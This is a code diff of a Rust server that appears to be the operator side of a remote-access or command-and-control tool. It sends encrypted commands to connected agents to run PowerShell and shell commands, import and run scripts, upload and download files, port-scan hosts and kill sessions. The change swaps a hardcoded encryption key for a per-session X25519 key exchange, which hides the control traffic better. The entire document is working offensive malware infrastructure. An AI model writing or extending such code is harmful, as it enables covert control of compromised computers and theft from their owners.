@@ -1,17 +1,16 @@
 use std::collections::HashMap;
 use std::fs::File;
 use base64::{Engine as _, engine::general_purpose};
-// use colored::Colorize;
 use std::io::{BufReader, Read, Write};
 use std::sync::Arc;
 use tokio::net::TcpStream;
 use tokio::sync::Mutex;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::time::{Duration, timeout};
-
+use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret};
+use rand::rngs::OsRng;
 use simple_crypt::{encrypt, decrypt};
 
-#[derive(Debug)]
 pub struct ConnectionInfo {
     pub id: usize,
     pub stream: Arc<Mutex<TcpStream>>,
@@ -19,6 +18,7 @@ pub struct ConnectionInfo {
     pub is_pivot: bool,
     pub username: String,
     pub os: String,
+    pub shared_secret: [u8; 32],
 }
 
 
@@ -48,19 +48,16 @@ pub async fn handle_importpsh(active_connections: &Arc<Mutex<HashMap<String, Con
     let import_cmd = "||IMPORTSCRIPT|| ".to_owned();
     let (_, connection_info) = active_connections.iter().nth(id).unwrap();
     let stream = connection_info.stream.clone();
-    let is_pivot = connection_info.is_pivot;
-    let command = if is_pivot {
-        format!("||PIVOTCMD|| {}", import_cmd)
-    } else {
-        import_cmd
-    };
+    let shared_secret = connection_info.shared_secret;
+
+    let command = import_cmd;
     let combined_command = format!("{}{} |!!done!!|", command, encoded_script);
-    let encrypted_command = encrypt(combined_command.as_bytes(), b"shared secret").expect("Failed to encrypt");
+    let encrypted_command = encrypt(combined_command.as_bytes(), &shared_secret).expect("Failed to encrypt");
     stream.lock().await.write(&encrypted_command).await.expect("Error writing to stream");
 
     stream.lock().await.flush().await.expect("Error flushing stream");
     stream.lock().await.read(&mut buffer).await.expect("Error reading from stream");
-    let data = decrypt(&buffer, b"shared secret").expect("Failed to decrypt");
+    let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
     let response = match String::from_utf8(data) {
         Ok(response) => response,
         Err(_) => return Err("Error converting response to string".to_string()),
@@ -85,12 +82,13 @@ pub async fn handle_run_script(active_connections: &Arc<Mutex<HashMap<String, Co
     }
     let (_, connection_info) = active_connections.iter().nth(id).unwrap();
     let stream = connection_info.stream.clone();
+    let shared_secret = connection_info.shared_secret;
     let command = format!("||RUNSCRIPT|| {}", function_name);
 
     timeout(Duration::from_secs(10), stream.lock().await
     .read(&mut [0u8; 1024])).await.expect("failed timeout").unwrap();
 
-    let encrypted_command = encrypt(command.as_bytes(), b"shared secret").expect("Failed to encrypt");
+    let encrypted_command = encrypt(command.as_bytes(), &shared_secret).expect("Failed to encrypt");
     stream.lock().await.write(&encrypted_command).await.expect("Error writing to stream");
     stream.lock().await.flush().await.expect("Error flushing stream");
     let mut cmdout = String::new();
@@ -100,27 +98,36 @@ pub async fn handle_run_script(active_connections: &Arc<Mutex<HashMap<String, Co
             Ok(n) => n,
             Err(_) => break,
         };
-        let data = decrypt(&buffer, b"shared secret").expect("Failed to decrypt");
+        let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
         cmdout.push_str(&String::from_utf8(data).unwrap());
     }
     cmdout = cmdout.replace("||cmd||", "");
     Ok(cmdout.trim().to_string())
 }
-pub async fn parse_client_info(stream: &mut Arc<Mutex<tokio::net::TcpStream>>) -> (String, String) {
+pub async fn parse_client_info(stream: &mut Arc<Mutex<tokio::net::TcpStream>>) -> (String, String, SharedSecret) {
     let mut rbuffer = [0; 1024];
     let mut stream_lock = stream.lock().await;
     let tcp_stream: &mut tokio::net::TcpStream = &mut *stream_lock;
 
+    let secret = EphemeralSecret::random_from_rng(&mut OsRng);
+    let public = PublicKey::from(&secret);
+    let public_bytes = public.as_bytes().to_vec();
+    let mut buffer = [0; 32];
+
+    tcp_stream.write(&public_bytes).await.unwrap();
+    tcp_stream.read(&mut buffer).await.unwrap();
+    
+    let shared_secret = secret.diffie_hellman(&PublicKey::from(buffer));
     let result = timeout(Duration::from_secs(3), tcp_stream.read(&mut rbuffer)).await;
     match result {
         Ok(Ok(_)) => {
-            let data = decrypt(&rbuffer, b"shared secret").expect("Failed to decrypt");
+            let data = decrypt(&rbuffer, shared_secret.as_bytes()).expect("Failed to decrypt");
             let data_string = String::from_utf8(data).expect("Failed to convert to String");
             let parts: Vec<&str> = data_string.split("||").collect();
             if parts[1] == "ACSINFO" {
-                return (parts[2].to_string(), parts[3].to_string());
+                return (parts[2].to_string(), parts[3].to_string(), shared_secret);
             } else {
-                return ("".to_string(), "".to_string());
+                return ("".to_string(), "".to_string(), shared_secret);
             }
         }
         Ok(Err(err)) => {
@@ -150,6 +157,7 @@ pub async fn handle_command(
     }
     let (_, connection_info) = active_connections.iter().nth(id).unwrap();
     let stream = connection_info.stream.clone();
+    let shared_secret = connection_info.shared_secret;
     let command_prefix = if command.starts_with("psh") { "||PSHEXEC||" } else { "||CMDEXEC||" };
     
     let command = if raw_connection {
@@ -158,13 +166,13 @@ pub async fn handle_command(
         format!("{} {}", command_prefix, command_str)
     };
     
-    let encrypted_command = encrypt(command.as_bytes(), b"shared secret").expect("Failed to encrypt");
+    let encrypted_command = encrypt(command.as_bytes(), &shared_secret).expect("Failed to encrypt");
     stream.lock().await.write(&encrypted_command).await.expect("Error writing to stream");
     stream.lock().await.flush().await.expect("Error flushing stream");
     let mut cmdout = String::new();
     let mut buffer = [0; 65536];
     stream.lock().await.read(&mut buffer).await.expect("Error reading from stream");
-    let data = decrypt(&buffer, b"shared secret").expect("Failed to decrypt");
+    let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
     if raw_connection {
         cmdout = String::from_utf8(data.to_vec()).unwrap();
     } else {
@@ -216,12 +224,13 @@ pub async fn handle_upload(active_connections: &Arc<Mutex<HashMap<String, Connec
     let upload_cmd = "||UPLOAD|| ".to_owned() + &destination;
     let (_,connection_info) = active_connections.iter().nth(id).unwrap();
     let stream = connection_info.stream.clone();
-    let upload_cmd = encrypt(upload_cmd.as_bytes(), b"shared secret").expect("Failed to encrypt");
+    let shared_secret = connection_info.shared_secret;
+    let upload_cmd = encrypt(upload_cmd.as_bytes(), &shared_secret).expect("Failed to encrypt");
     stream.lock().await.write(&upload_cmd).await.expect("Error writing to stream");
     
     let combined_command = format!("{} |!!done!!|", encoded_file.trim());
     for chunk in combined_command.as_bytes().chunks(956) {
-        let encrypted_command = encrypt(chunk, b"shared secret").expect("Failed to encrypt");
+        let encrypted_command = encrypt(chunk, &shared_secret).expect("Failed to encrypt");
         stream.lock().await.write(&encrypted_command).await.expect("Error writing to stream");
     }
     
@@ -230,7 +239,7 @@ pub async fn handle_upload(active_connections: &Arc<Mutex<HashMap<String, Connec
         Ok(n) => n,
         Err(_) => return Err("Error reading from stream".to_string()),
     };
-    let data = decrypt(&buffer, b"shared secret").expect("Failed to decrypt");
+    let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
     let response = match String::from_utf8(data) {
         Ok(response) => response,
         Err(_) => return Err("Error converting response to string".to_string()),
@@ -258,7 +267,8 @@ pub async fn handle_download(active_connections: &Arc<Mutex<HashMap<String, Conn
     let download_cmd = "||DOWNLOAD|| ".to_owned() + &download_input;
     let (_, connection_info) = active_connections.iter().nth(id).unwrap();
     let stream = connection_info.stream.clone();
-    let download_cmd = encrypt(download_cmd.as_bytes(), b"shared secret").expect("Failed to encrypt");
+    let shared_secret = connection_info.shared_secret;
+    let download_cmd = encrypt(download_cmd.as_bytes(), &shared_secret).expect("Failed to encrypt");
     
     stream.lock().await.write(&download_cmd).await.expect("Error writing to stream");
     let mut file = match File::create(filename) {
@@ -270,7 +280,7 @@ pub async fn handle_download(active_connections: &Arc<Mutex<HashMap<String, Conn
     loop {
         match stream.lock().await.read(&mut buffer).await {
             Ok(_) => {
-                let decrypted_data = decrypt(&buffer, b"shared secret").expect("Failed to decrypt");
+                let decrypted_data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
                 let data = match String::from_utf8(decrypted_data) {
                     Ok(data) => data,
                     Err(_) => return Err("Error converting data to string".to_string()),
@@ -317,14 +327,15 @@ pub async fn handle_port_scan(active_connections: &Arc<Mutex<HashMap<String, Con
     let port_scan_cmd = "||SCAN|| ".to_owned() + ip + " " + &num1 + " " + &num2;
     let (_, connection_info) = active_connections.iter().nth(id).unwrap();
     let stream = connection_info.stream.clone();
-    let port_scan_cmd = encrypt(port_scan_cmd.as_bytes(), b"shared secret").expect("Failed to encrypt");
+    let shared_secret = connection_info.shared_secret;
+    let port_scan_cmd = encrypt(port_scan_cmd.as_bytes(), &shared_secret).expect("Failed to encrypt");
     stream.lock().await
         .write(&port_scan_cmd).await
         .expect("Error writing to stream");
     stream.lock().await.flush().await.expect("Error flushing stream");
     let mut buffer = [0; 1024];
     let _ = stream.lock().await.read(&mut buffer).await.unwrap();
-    let data = decrypt(&buffer, b"shared secret").expect("Failed to decrypt");
+    let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
     let response = String::from_utf8(data).unwrap();
     let factor = format!("{}:", ip);
     let mut ports: Vec<&str> = response.split(&factor).collect();
@@ -351,11 +362,12 @@ pub async fn handle_kill(active_connections: &Arc<Mutex<HashMap<String, Connecti
     let active_connections = active_connections.lock().await;
     let (_, connection_info) = active_connections.iter().nth(id).unwrap();
     let stream = connection_info.stream.clone();
+    let shared_secret = connection_info.shared_secret;
 
     if raw_connection {
         stream.lock().await.write(b"exit\n").await.expect("Error writing to stream");
     } else {
-        let cmd = encrypt(b"||EXIT||", b"shared secret").expect("Failed to encrypt");
+        let cmd = encrypt(b"||EXIT||", &shared_secret).expect("Failed to encrypt");
         stream.lock().await.write(&cmd).await.expect("Error writing to stream");
     }
     stream.lock().await.flush().await.expect("Error flushing stream");
